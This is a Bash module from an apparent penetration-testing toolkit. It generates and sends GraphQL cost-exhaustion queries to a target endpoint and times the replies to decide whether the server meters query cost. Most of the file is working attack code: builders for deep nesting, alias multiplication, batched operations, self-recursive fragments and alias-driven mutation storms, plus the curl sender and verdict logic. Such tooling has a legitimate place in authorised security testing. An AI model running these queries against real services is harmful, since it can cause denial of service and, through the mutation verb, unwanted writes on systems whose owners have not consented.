#!/usr/bin/env bash
# 68_graphql_dos.sh — cloudsting module 68: ask for the same thing a million times
# Verbs: --probe | --depth | --aliases | --batched | --cost | --fragment
#        | --directive | --mutate | --techniques | --list | --status-tsv
#        | --menu | --selftest | --help
set -u
umask 077

# A parent that sourced the core exports CS_MOD_DIR; this module derives its own.
unset CS_MOD_DIR

MODULE_ID="68_graphql_dos"
MOD_NAME="GraphQL Query Cost (depth, aliases, batching and fragments)"
MOD_VERSION="1.0.0"
# shellcheck source=../data/lib/core.sh
source "$(dirname "${BASH_SOURCE[0]}")/../data/lib/core.sh"

MOD_DIR="$CS_MOD_DIR"
export MOD_DIR

GD_RUN_ID="$CS_RUN_ID"
export GD_RUN_ID
RUN_ID="$CS_RUN_ID"
export RUN_ID

OUT_DIR="$CS_LOOT/graphql_dos"
mkdir -p "$OUT_DIR" 2>/dev/null || true

HIT_FILE="$OUT_DIR/hits-$RUN_ID.tsv"
PROBE_FILE="$OUT_DIR/probe-$RUN_ID.tsv"

: "${GD_TIMEOUT:=15}"
: "${GD_UA:=Mozilla/5.0 (X11; Linux x86_64) cloudsting/68}"
: "${GD_STEP:=12}"        # how much bigger each rung is than the last
: "${GD_MAX_MS:=60000}"   # the wall past which a reply is a denial of service
: "${GD_ALIASES:=200}"    # aliases per request at the top rung
: "${GD_BATCH:=50}"       # operations per batched request

gd_log() { printf '[%s] %s\n' "$MODULE_ID" "$*" >&2; }

# ── the techniques ───────────────────────────────────────────────
# A cost attack is not a payload, it is a shape. Each row names the shape, the
# field that carries it, and what a server that does not meter it hands back.
#   <id>\t<shape>\t<cost-lives-in>\t<what an unmetered server gives away>
gd_techniques() {
    cat <<'TECHNIQUES'
depth	recursion	field nesting	a resolver chain the depth limit was supposed to stop
aliases	multiplication	alias count	one response carrying N copies of an expensive field
batched	batching	operation count per body	every operation runs, one error is all you see
fragments	expansion	spread count	a fragment nested N deep through itself
directive	conditional	include/skip on a heavy field	the field runs; the directive only hides it
cost-override	declaration	@cost or @complexity args	a client-declared weight the server trusts
first-n	enumeration	connection.first / limit	no ceiling on how many children come back
wide-select	selection	many sibling fields	one query, every field at once
mutate-storm	side-effect	mutation aliases	each alias runs the mutation
subscription	stream	subscription field count	one handshake, many streams
TECHNIQUES
}

# The probe ladder: each rung is a multiple of the last, so a server that meters
# cost answers at rung 2 and not rung 6, and the shape of the curve is the
# finding rather than any single request.
gd_rungs() {
    cat <<'RUNGS'
1	depth	3
2	depth	6
3	depth	10
4	depth	16
5	depth	24
6	aliases	20
7	aliases	80
8	aliases	200
9	batched	10
10	batched	50
RUNGS
}

# ── the query builders ───────────────────────────────────────────
# A nested selection has to repeat the same field to recurse, because the
# server's schema is unknown. The cycle name is configurable for the case where
# it is known (from --introspect on module 43).
#   gd_depth_query <field> <depth>
gd_depth_query() {
    local field="${1:-viewer}" depth="${2:-10}" i
    printf '{'
    for ((i = 0; i < depth; i++)); do printf '%s{' "$field"; done
    printf '__typename'
    for ((i = 0; i < depth; i++)); do printf '}'; done
    printf '}'
}

# Alias multiplication: the same expensive field, N names, one body.
#   gd_alias_query <field> <count>
gd_alias_query() {
    local field="${1:-viewer}" count="${2:-200}" i
    printf '{'
    for ((i = 0; i < count; i++)); do printf 'a%d:%s{__typename}' "$i" "$field"; done
    printf '}'
}

# Batched: one body, many operations. GraphQL permits it, and a server that only
# counts operations per second at the transport sees one request.
#   gd_batch_query <field> <count>
gd_batch_query() {
    local field="${1:-viewer}" count="${2:-50}" i
    printf '['
    for ((i = 0; i < count; i++)); do
        (( i > 0 )) && printf ','
        printf '{"query":"{a%d:%s{__typename}}","variables":{}}' "$i" "$field"
    done
    printf ']'
}

# A self-spreading fragment. Servers that expand fragments without a depth gate
# recurse until they run out of stack.
#   gd_fragment_query <field> <spread>
gd_fragment_query() {
    local field="${1:-viewer}" spread="${2:-8}" i
    printf 'fragment F0 on Query{%s{...F1}}' "$field"
    for ((i = 1; i < spread; i++)); do
        printf ' fragment F%d on Query{%s{...F%d}}' "$i" "$field" "$((i + 1))"
    done
    printf ' fragment F%d on Query{__typename}' "$spread"
    printf ' { ...F0 }'
}

# Conditional directives: @include(if:true) is a hint, and a parser that strips
# the directive before resolution still resolves the field.
#   gd_directive_query <field> <count>
gd_directive_query() {
    local field="${1:-viewer}" count="${2:-50}" i
    printf '{'
    for ((i = 0; i < count; i++)); do
        printf 'd%d:%s@include(if:true){__typename}' "$i" "$field"
    done
    printf '}'
}

# Wide select: everything a client can name in one shape, on the theory that the
# resolver cost is what hurts even when the field list is legal.
#   gd_wide_query <field> <count>
gd_wide_query() {
    local field="${1:-viewer}" count="${2:-200}" i
    printf '{'
    for ((i = 0; i < count; i++)); do printf '%s%d{__typename}' "$field" "$i"; done
    printf '}'
}

# Mutation storm: aliases pointing at one mutation. A server that meters queries
# but not mutations writes N rows.
#   gd_mutate_query <mutation> <count>
gd_mutate_query() {
    local mutation="${1:-login}" count="${2:-50}" i
    printf 'mutation{'
    for ((i = 0; i < count; i++)); do
        printf 'm%d:%s(input:{}){__typename}' "$i" "$mutation"
    done
    printf '}'
}

# ── one request ──────────────────────────────────────────────────
# Time is the measurement, so it is captured twice: total seconds from curl and
# the body size, because a metered server answers small and fast with an error.
#   gd_send <url> <body> [token]
#   -> code \x1f bytes \x1f seconds \x1f keys \x1f body-path
gd_send() {
    local url="$1" body="$2" token="${3:-}"
    local out; out="$(mktemp "$CS_SCRATCH/gd.XXXXXX")" 2>/dev/null || out="$OUT_DIR/.gd.$$"
    local -a args=(-s -o "$out" --max-time "$GD_TIMEOUT" -A "$GD_UA"
                   -H 'Content-Type: application/json' --data-binary "$body")
    [[ -n "$token" ]] && args+=(-H "Authorization: Bearer $token")

    # curl's --write-out switches on \t literally, so the three values are
    # emitted space-separated here and split in awk; a tab inside the format
    # string would arrive as backslash-t and swallow the whole row.
    local meta code bytes secs
    meta="$(curl "${args[@]}" \
        --write-out '%{http_code} %{size_download} %{time_total}' "$url" 2>/dev/null)"
    read -r code bytes secs <<<"$(awk -v m="$meta" 'BEGIN{
        n=split(m,f," "); if (n<3) { print "000 0 0"; exit }
        printf "%s %s %s", f[n-2], f[n-1], f[n] }')"
    [[ -z "$code" || "$code" == "000" ]] && code="000"

    local keys response
    # GraphQL reports errors in a 200 as often as in a 4xx, so the body is read
    # for an error envelope rather than trusting the status code
    keys="$(gd_error_class "$out")"
    response="$(head -c 200 "$out" 2>/dev/null | tr -d '\r\n' | tr '\t' ' ')"
    printf '%s\037%s\037%s\037%s\037%s\037%s\n' \
        "$code" "${bytes:-0}" "${secs:-0}" "$keys" "$out" "$response"
}

# The cheapest way to detect a refusal: the body names it.
#   -> none | depth-limit | complexity-limit | rate-limited | validation | timeout
gd_error_class() {
    local file="$1"
    [[ -f "$file" ]] || { printf 'none'; return; }
    local body
    body="$(head -c 4096 "$file" 2>/dev/null | tr -d '\r')"
    case "$body" in
        *"query is too complex"*|*"too complex"*|*"complexity"*|*"exceeds maximum"*)
            printf 'complexity-limit'; return ;;
        *"too deep"*|*"maximum depth"*|*"depth limit"*|*"depth of"*)
            printf 'depth-limit'; return ;;
        *"too many requests"*|*"rate limit"*|*"Too Many Requests"*)
            printf 'rate-limited'; return ;;
        *"too many operations"*|*"batch"*"limit"*)
            printf 'batch-limit'; return ;;
        *"Cannot query field"*|*"Cannot return null"*|*"Syntax Error"*|*"Unexpected"*)
            printf 'validation'; return ;;
        *"timed out"*|*"timeout"*)
            printf 'timeout'; return ;;
    esac
    printf 'none'
}

# ── the verdict ──────────────────────────────────────────────────
# A cost finding needs the curve, not a single sample: the control rung and the
# top rung, both meaningful. Five outcomes worth separating:
#   metered     the top rung was refused for cost — the server is doing its job
#   unbounded   the top rung answered 200, in full, and the control did not
#   slow-burn   the top rung is under GD_MAX_MS but grew past 4x the control
#   invalid     the server rejected the query shape (validation) — the field
#               name is wrong, which is an operator problem, not a finding
#   unreachable / flat
#   gd_curve_verdict <control-code> <control-sec> <top-code> <top-sec> <top-class> <top-bytes>
gd_curve_verdict() {
    local ccode="$1" csec="$2" tcode="$3" tsec="$4" tclass="$5" tbytes="$6"
    [[ "$ccode" == "000" ]] && { printf 'unreachable'; return; }
    case "$tclass" in
        depth-limit|complexity-limit|batch-limit|rate-limited) printf 'metered'; return ;;
        validation) printf 'invalid'; return ;;
    esac
    [[ "$tcode" == "000" ]] && { printf 'unreachable'; return; }
    [[ "$tcode" -ge 400 ]] && { printf 'rejected'; return; }
    # integer seconds are too coarse for a fast server; compare in millis
    local cms tms
    cms="$(gd_ms "$csec")"; tms="$(gd_ms "$tsec")"
    if (( tms >= GD_MAX_MS )); then printf 'unbounded'; return; fi
    if (( cms > 0 && tms > cms * 4 && tms - cms > 500 )); then printf 'slow-burn'; return; fi
    [[ "${tbytes:-0}" -gt 0 ]] && { printf 'flat'; return; }
    printf 'empty'
}

# curl reports time_total as fractional seconds; millis are what comparisons need
gd_ms() {
    local secs="${1:-0}"
    awk -v s="$secs" 'BEGIN{ printf "%d", (s*1000)+0.5 }' 2>/dev/null || printf '0'
}

# ── verbs ────────────────────────────────────────────────────────

# --probe <graphql-url> [field] [token]: the ladder. Control first, then each
# rung of the same shape, then the verdict from the curve.
gd_cmd_probe() {
    local url="${1:-}" field="${2:-viewer}" token="${3:-}"
    [[ -z "$url" ]] && { gd_log "usage: --probe <graphql-url> [field] [token]"; return 2; }
    cs_row TARGET "$url"
    cs_row FIELD "$field"
    cs_row LIMITS "max_ms=$GD_MAX_MS alias_top=$GD_ALIASES batch_top=$GD_BATCH"

    # control: a shape nobody can call expensive
    local ctrl; ctrl='{"query":"{__typename}"}'
    local c_code c_bytes c_sec c_cls c_body c_resp
    cs_split "$(gd_send "$url" "$ctrl" "$token")" c_code c_bytes c_sec c_cls c_body c_resp
    rm -f "$c_body"
    cs_row CONTROL "code=$c_code" "sec=$c_sec" "class=$c_cls"
    if [[ "$c_code" == "000" ]]; then
        cs_row VERDICT "unreachable" "the endpoint did not answer an ordinary query"
        cs_row SUMMARY "rungs=0 verdict=unreachable"
        return 3
    fi

    : > "$HIT_FILE"
    local rung shape top
    local worst="" worst_ms=0 top_ms=0 top_code=0 top_cls=none top_bytes=0
    local counted=0
    while IFS=$'\t' read -r rung shape top; do
        [[ -z "$rung" ]] && continue
        local body
        case "$shape" in
            depth)   body="$(gd_build '{"query":"QUERY"}')"; body="${body/QUERY/$(gd_depth_query "$field" "$top")}" ;;
            aliases) body="$(gd_alias_json "$field" "$top")" ;;
            batched) body="$(gd_batch_query "$field" "$top")" ;;
            *)       continue ;;
        esac
        counted=$((counted + 1))

        local p_code p_bytes p_sec p_cls p_body p_resp
        cs_split "$(gd_send "$url" "$body" "$token")" p_code p_bytes p_sec p_cls p_body p_resp
        rm -f "$p_body"
        local pms; pms="$(gd_ms "$p_sec")"
        printf 'rung\t%s\t%s\t%s\t%s\t%s\t%s\n' "$rung" "$shape" "$top" "$p_code" "$pms" "$p_cls" >> "$PROBE_FILE"
        cs_row RUNG "$rung" "shape=$shape" "n=$top" "code=$p_code" "ms=$pms" "class=$p_cls"

        (( pms > worst_ms )) && { worst_ms=$pms; worst="$rung:$shape:$top"; }
        # the top rung per shape is what the curve verdict reads
        if [[ "$shape" == "depth" || "$shape" == "batched" || "$shape" == "aliases" ]]; then
            top_ms=$pms; top_code=$p_code; top_cls=$p_cls; top_bytes=$p_bytes
        fi
    done < <(gd_rungs)

    local verdict
    verdict="$(gd_curve_verdict "$c_code" "$c_sec" "$top_code" \
        "$(awk -v ms="$top_ms" 'BEGIN{printf "%.3f", ms/1000}')" "$top_cls" "$top_bytes")"
    local overall="clean"
    case "$verdict" in
        unbounded|slow-burn) overall="unmetered" ;;
        metered)   overall="metered" ;;
        invalid)   overall="wrong-field" ;;
    esac
    cs_row VERDICT "$overall" "$verdict"
    cs_row COST "control_ms=$(gd_ms "$c_sec")" "top_ms=$top_ms" "worst=$worst:$worst_ms" "class=$top_cls"

    if [[ "$overall" == "unmetered" ]]; then
        local sev="HIGH"
        [[ "$verdict" == "unbounded" ]] && sev="CRITICAL"
        cs_findings_row "$MODULE_ID" "WEBAPI" "$url" "$sev" "graphql-cost-$verdict" \
            "$verdict: a $top-strong $field query answered in ${top_ms}ms against a $(gd_ms "$c_sec")ms control — no depth or cost meter"
        printf '%s\t%s\t%s\t%s\n' "$verdict" "$field" "$top_ms" "$sev" >> "$HIT_FILE"
    elif [[ "$verdict" == "metered" ]]; then
        cs_row NOTE "the server refused the expensive shape — depth or cost metering is on"
    elif [[ "$verdict" == "invalid" ]]; then
        cs_row NOTE "the query shape was rejected by validation: \`$field\` may not be a real field"
    fi
    cs_row SUMMARY "rungs=$counted verdict=$verdict control_ms=$(gd_ms "$c_sec") top_ms=$top_ms"
    cs_row ARTIFACT "$PROBE_FILE" "$HIT_FILE"
    return 0
}

# small helper so the case above stays readable
gd_build() { printf '%s' "$1"; }

# alias queries must be valid JSON with the shape inside; the body is built as
# JSON so a server that parses strictly still accepts it
gd_alias_json() {
    local field="$1" count="$2" i q="{"
    for ((i = 0; i < count; i++)); do q+="a$i:$field{__typename}"; done
    q+="}"
    printf '{"query":"%s"}' "$(printf '%s' "$q" | sed 's/"/\\"/g')"
}

# --depth <url> <n> [field] [token]: one rung, exactly, with the query kept.
gd_cmd_depth() {
    local url="${1:-}" n="${2:-12}" field="${3:-viewer}" token="${4:-}"
    [[ -z "$url" ]] && { gd_log "usage: --depth <url> <depth> [field] [token]"; return 2; }
    cs_row TARGET "$url"
    cs_row DEPTH "$n"
    local q; q="$(gd_depth_query "$field" "$n")"
    local file="$OUT_DIR/depth-$n-$RUN_ID.graphql"
    printf '%s\n' "$q" > "$file"; chmod 600 "$file" 2>/dev/null || true
    cs_row QUERY "$file" "$(wc -c < "$file" | tr -d ' ') bytes"
    gd_one "$url" "$q" "$token"
}

# --aliases <url> <count> [field] [token]
gd_cmd_aliases() {
    local url="${1:-}" n="${2:-$GD_ALIASES}" field="${3:-viewer}" token="${4:-}"
    [[ -z "$url" ]] && { gd_log "usage: --aliases <url> <count> [field] [token]"; return 2; }
    cs_row TARGET "$url"
    cs_row ALIASES "$n"
    gd_one "$url" "$(gd_alias_json "$field" "$n")" "$token"
}

# --batched <url> <count> [field] [token]
gd_cmd_batched() {
    local url="${1:-}" n="${2:-$GD_BATCH}" field="${3:-viewer}" token="${4:-}"
    [[ -z "$url" ]] && { gd_log "usage: --batched <url> <count> [field] [token]"; return 2; }
    cs_row TARGET "$url"
    cs_row BATCH "$n"
    gd_one "$url" "$(gd_batch_query "$field" "$n")" "$token"
}

# --fragment <url> <spread> [field] [token]
gd_cmd_fragment() {
    local url="${1:-}" n="${2:-8}" field="${3:-viewer}" token="${4:-}"
    [[ -z "$url" ]] && { gd_log "usage: --fragment <url> <spread> [field] [token]"; return 2; }
    cs_row TARGET "$url"
    cs_row SPREAD "$n"
    gd_one "$url" "{\"query\":\"$(gd_fragment_query "$field" "$n" | sed 's/"/\\"/g')\"}" "$token"
}

# --directive <url> <count> [field] [token]
gd_cmd_directive() {
    local url="${1:-}" n="${2:-50}" field="${3:-viewer}" token="${4:-}"
    [[ -z "$url" ]] && { gd_log "usage: --directive <url> <count> [field] [token]"; return 2; }
    cs_row TARGET "$url"
    cs_row DIRECTIVES "$n"
    gd_one "$url" "{\"query\":\"$(gd_directive_query "$field" "$n" | sed 's/"/\\"/g')\"}" "$token"
}

# --mutate <url> <mutation> <count> [token]
gd_cmd_mutate() {
    local url="${1:-}" mutation="${2:-login}" n="${3:-50}" token="${4:-}"
    [[ -z "$url" || -z "$mutation" ]] && { gd_log "usage: --mutate <url> <mutation> <count> [token]"; return 2; }
    cs_row TARGET "$url"
    cs_row MUTATION "$mutation"
    cs_row ALIASES "$n"
    cs_row WARNING "each alias runs the mutation — this writes, and only a lab target should receive it"
    gd_one "$url" "{\"query\":\"$(gd_mutate_query "$mutation" "$n" | sed 's/"/\\"/g')\"}" "$token"
}

# --cost <url> [field] [token]: the whole ladder but compared against the
# control, printed as a table a reader can argue with.
gd_cmd_cost() {
    local url="${1:-}" field="${2:-viewer}" token="${3:-}"
    [[ -z "$url" ]] && { gd_log "usage: --cost <url> [field] [token]"; return 2; }
    cs_row TARGET "$url"
    local c_code c_bytes c_sec c_cls c_body c_resp
    cs_split "$(gd_send "$url" '{"query":"{__typename}"}' "$token")" \
        c_code c_bytes c_sec c_cls c_body c_resp
    rm -f "$c_body"
    cs_row CONTROL "code=$c_code" "ms=$(gd_ms "$c_sec")"
    local d i
    for d in 3 6 10 16 24; do
        cs_split "$(gd_send "$url" "{\"query\":\"$(gd_depth_query "$field" "$d" | sed 's/"/\\"/g')\"}" "$token")" \
            p_code p_bytes p_sec p_cls p_body p_resp
        rm -f "$p_body"
        cs_row DEPTH "$d" "code=$p_code" "ms=$(gd_ms "$p_sec")" "class=$p_cls"
    done
    for i in 20 80; do
        cs_split "$(gd_send "$url" "$(gd_alias_json "$field" "$i")" "$token")" \
            p_code p_bytes p_sec p_cls p_body p_resp
        rm -f "$p_body"
        cs_row ALIASES "$i" "code=$p_code" "ms=$(gd_ms "$p_sec")" "class=$p_cls"
    done
    cs_row SUMMARY "rows=7"
    return 0
}

# One shaped request, reported the same way for every single-rung verb.
gd_one() {
    local url="$1" body="$2" token="$3"
    local code bytes sec cls bpath resp
    cs_split "$(gd_send "$url" "$body" "$token")" code bytes sec cls bpath resp
    rm -f "$bpath"
    local ms; ms="$(gd_ms "$sec")"
    cs_row RESPONSE "code=$code" "bytes=$bytes" "ms=$ms" "class=$cls"
    cs_row VERDICT "$(gd_single_verdict "$code" "$cls" "$ms")"
    cs_row SUMMARY "code=$code ms=$ms class=$cls"
    return 0
}

# One rung alone cannot prove metering, so it reports what it saw and says so.
gd_single_verdict() {
    local code="$1" cls="$2" ms="$3"
    [[ "$code" == "000" ]] && { printf 'unreachable'; return; }
    case "$cls" in
        depth-limit|complexity-limit|batch-limit|rate-limited) printf 'metered'; return ;;
        validation) printf 'invalid-shape'; return ;;
    esac
    (( ms >= GD_MAX_MS )) && { printf 'answered-slow'; return; }
    [[ "$code" -ge 400 ]] && { printf 'rejected'; return; }
    printf 'answered'
}

gd_cmd_techniques() {
    local t shape lives wins
    while IFS=$'\t' read -r t shape lives wins; do
        [[ -z "$t" ]] && continue
        cs_row TECHNIQUE "$t" "$shape" "$lives" "$wins"
    done < <(gd_techniques)
    cs_row SUMMARY "techniques=$(gd_techniques | wc -l | tr -d ' ')"
    return 0
}

gd_cmd_rungs() {
    local rung shape n
    while IFS=$'\t' read -r rung shape n; do
        [[ -z "$rung" ]] && continue
        cs_row RUNG "$rung" "$shape" "$n"
    done < <(gd_rungs)
    cs_row SUMMARY "rungs=$(gd_rungs | wc -l | tr -d ' ')"
    return 0
}

gd_cmd_list() { gd_cmd_techniques; }

gd_cmd_status_tsv() {
    local curl_state
    command -v curl >/dev/null 2>&1 && curl_state="curl-ok" || curl_state="curl-missing"
    printf '%s\t%s\t%s\ttechniques-%s\trungs-%s\n' \
        "$MODULE_ID" "$MOD_NAME" "$curl_state" \
        "$(gd_techniques | wc -l | tr -d ' ')" "$(gd_rungs | wc -l | tr -d ' ')"
}

gd_cmd_menu() { printf 'menu\t%s\t[%s] %s\n' "$MODULE_ID" "$MOD_VERSION" "$MOD_NAME"; }

gd_cmd_help() {
    cat <<'HELP'
cloudsting module 68 — GraphQL Query Cost v1.0.0
  --probe <url> [field] [token]      the ladder: control, then depth/alias/batch rungs
  --cost <url> [field] [token]       the same curve as a table
  --depth <url> <n> [field] [token]  one nesting depth, exactly
  --aliases <url> <n> [field] [tok]  one field multiplied by aliases
  --batched <url> <n> [field] [tok]  n operations in one body
  --fragment <url> <n> [field] [tok] a self-spreading fragment
  --directive <url> <n> [field] [tok] conditional directives on a heavy field
  --mutate <url> <mutation> <n> [tok] aliases on a mutation — this writes
  --techniques | --rungs | --list | --status-tsv | --menu | --selftest | --help

Cost is measured as a curve, never as one request: the control is the cheapest
query the schema allows, and the finding is the gap between it and the top rung.
A server that refuses with "query is too complex" or "too deep" is metered, and
that is reported as a note, not a finding. A server that rejects the shape with
"cannot query field" is told apart from one that is vulnerable, because a wrong
field name is the operator's problem, not the target's.

Environment: GD_TIMEOUT (15), GD_MAX_MS (60000), GD_STEP, GD_ALIASES, GD_BATCH
HELP
}

# ── Selftest ─────────────────────────────────────────────────────
gd_selftest() {
    cs_selftest_reset

    local n; n="$(gd_techniques | wc -l | tr -d ' ')"
    chk tech-many   "$( (( n >= 10 )) && echo many || echo few )" "many"
    chk tech-4col   "$(gd_techniques | awk -F'\t' 'NF!=4{c++} END{print c+0}')" "0"
    chk tech-unique "$(gd_techniques | cut -f1 | sort -u | wc -l | tr -d ' ')" "$n"
    chk rung-count  "$(gd_rungs | wc -l | tr -d ' ')" "10"
    chk rung-3col   "$(gd_rungs | awk -F'\t' 'NF!=3{c++} END{print c+0}')" "0"

    # builders produce what their names claim
    chk q-depth-open  "$(gd_depth_query viewer 4 | grep -o '{' | wc -l | tr -d ' ')" "5"
    chk q-depth-shut  "$(gd_depth_query viewer 4 | grep -o '}' | wc -l | tr -d ' ')" "5"
    chk q-depth-has   "$(gd_depth_query viewer 3 | grep -c '__typename')" "1"
    chk q-alias-count "$(gd_alias_query viewer 7 | grep -o 'a[0-9]*:' | wc -l | tr -d ' ')" "7"
    chk q-alias-json  "$(gd_alias_json viewer 3 | python3 -c 'import sys,json;print(json.load(sys.stdin)["query"].count("{__typename}"))' 2>/dev/null)" "3"
    chk q-batch       "$(gd_batch_query viewer 4 | grep -o '"query"' | wc -l | tr -d ' ')" "4"
    chk q-batch-json  "$(gd_batch_query viewer 3 | python3 -c 'import sys,json;print(len(json.load(sys.stdin)))' 2>/dev/null)" "3"
    chk q-frag-spread "$(gd_fragment_query viewer 4 | grep -o '\.\.\.F' | wc -l | tr -d ' ')" "5"
    chk q-directive   "$(gd_directive_query viewer 6 | grep -o '@include' | wc -l | tr -d ' ')" "6"
    chk q-mutate      "$(gd_mutate_query login 5 | grep -o 'm[0-9]*:' | wc -l | tr -d ' ')" "5"

    # json escaping: a builder fed through the body must stay parseable
    chk q-json-ok     "$(gd_alias_json viewer 2 | python3 -c 'import sys,json;json.load(sys.stdin);print("ok")' 2>/dev/null)" "ok"
    chk q-batch-ok    "$(gd_batch_query viewer 2 | python3 -c 'import sys,json;json.load(sys.stdin);print("ok")' 2>/dev/null)" "ok"

    # error classification on real bodies
    local f; f="$(mktemp "$CS_SCRATCH/gd-e.XXXXXX")" 2>/dev/null || f="$OUT_DIR/.e.$$"
    printf '{"errors":[{"message":"Query is too complex: 1200 > 1000"}]}' > "$f"
    chk e-complex  "$(gd_error_class "$f")" "complexity-limit"
    printf '{"errors":[{"message":"Maximum depth of 10 exceeded"}]}' > "$f"
    chk e-depth    "$(gd_error_class "$f")" "depth-limit"
    printf '{"errors":[{"message":"Cannot query field \\"viewer\\" on type \\"Query\\""}]}' > "$f"
    chk e-valid    "$(gd_error_class "$f")" "validation"
    printf '{"errors":[{"message":"Too Many Requests"}]}' > "$f"
    chk e-rate     "$(gd_error_class "$f")" "rate-limited"
    printf '{"errors":[{"message":"bad gateway timed out"}]}' > "$f"
    chk e-timeout  "$(gd_error_class "$f")" "timeout"
    printf '{"data":{"__typename":"Query"}}' > "$f"
    chk e-none     "$(gd_error_class "$f")" "none"
    chk e-nofile   "$(gd_error_class "$f.nope")" "none"
    rm -f "$f"

    # millis conversion: curl hands back fractional seconds
    chk ms-zero    "$(gd_ms 0)" "0"
    chk ms-one     "$(gd_ms 1)" "1000"
    chk ms-frac    "$(gd_ms 0.25)" "250"

    # curve verdict table — the whole point of the module
    chk v-unreach  "$(gd_curve_verdict 000 0 000 0 none 0)" "unreachable"
    chk v-metered  "$(gd_curve_verdict 200 0.02 400 0.02 complexity-limit 90)" "metered"
    chk v-metered2 "$(gd_curve_verdict 200 0.02 400 0.02 depth-limit 90)" "metered"
    chk v-invalid  "$(gd_curve_verdict 200 0.02 200 0.02 validation 120)" "invalid"
    chk v-unbound  "$(gd_curve_verdict 200 0.02 200 90 none 900000)" "unbounded"
    chk v-slow     "$(gd_curve_verdict 200 0.02 200 1.5 none 4096)" "slow-burn"
    chk v-flat     "$(gd_curve_verdict 200 0.02 200 0.03 none 4096)" "flat"
    chk v-reject   "$(gd_curve_verdict 200 0.02 500 0.02 none 90)" "rejected"

    # single-rung verdict
    chk s-metered  "$(gd_single_verdict 400 depth-limit 20)" "metered"
    chk s-invalid  "$(gd_single_verdict 200 validation 20)" "invalid-shape"
    chk s-slow     "$(gd_single_verdict 200 none 90000)" "answered-slow"
    chk s-answered "$(gd_single_verdict 200 none 30)" "answered"

    # a dead host is unreachable, never a finding
    local out; out="$(gd_cmd_probe http://127.0.0.1:9 viewer 2>/dev/null)"
    chk dead-verdict "$(printf '%s' "$out" | awk -F'\t' '$1=="VERDICT"{print $2}')" "unreachable"
    chk dead-rc      "$(gd_cmd_probe http://127.0.0.1:9 2>/dev/null >/dev/null; echo $?)" "3"

    # usage errors, not crashes
    gd_cmd_probe 2>/dev/null;   chk prb-usage "$?" "2"
    gd_cmd_depth 2>/dev/null;   chk dep-usage "$?" "2"
    gd_cmd_aliases 2>/dev/null; chk ali-usage "$?" "2"
    gd_cmd_batched 2>/dev/null; chk bat-usage "$?" "2"
    gd_cmd_fragment 2>/dev/null; chk frag-usage "$?" "2"
    gd_cmd_directive 2>/dev/null; chk dir-usage "$?" "2"
    gd_cmd_mutate 2>/dev/null;  chk mut-usage "$?" "2"
    gd_cmd_cost 2>/dev/null;    chk cost-usage "$?" "2"

    # shape contracts
    chk status-fields "$(gd_cmd_status_tsv | awk -F'\t' '{print NF}')" "5"
    chk status-module "$(gd_cmd_status_tsv | awk -F'\t' '{print $1}')" "$MODULE_ID"
    chk menu-fields   "$(gd_cmd_menu | awk -F'\t' '{print NF}')" "3"
    chk help-first    "$(gd_cmd_help | head -1 | grep -ci 'GraphQL Query Cost')" "1"
    chk list-rows     "$(gd_cmd_list | grep -c '^TECHNIQUE')" "$n"
    chk rungs-rows    "$(gd_cmd_rungs | grep -c '^RUNG')" "10"

    cs_selftest_done
}

# ── Dispatch ─────────────────────────────────────────────────────
[ "${BASH_SOURCE[0]}" = "$0" ] || return 0
case "${1:-}" in
    --probe)     shift; gd_cmd_probe "$@";;
    --cost)      shift; gd_cmd_cost "$@";;
    --depth)     shift; gd_cmd_depth "$@";;
    --aliases)   shift; gd_cmd_aliases "$@";;
    --batched)   shift; gd_cmd_batched "$@";;
    --fragment)  shift; gd_cmd_fragment "$@";;
    --directive) shift; gd_cmd_directive "$@";;
    --mutate)    shift; gd_cmd_mutate "$@";;
    --techniques) gd_cmd_techniques;;
    --rungs)     gd_cmd_rungs;;
    --list)      gd_cmd_list;;
    --status-tsv|--status) gd_cmd_status_tsv;;
    --menu)      gd_cmd_menu;;
    --selftest)  gd_selftest;;
    *)           gd_cmd_help;;
esac
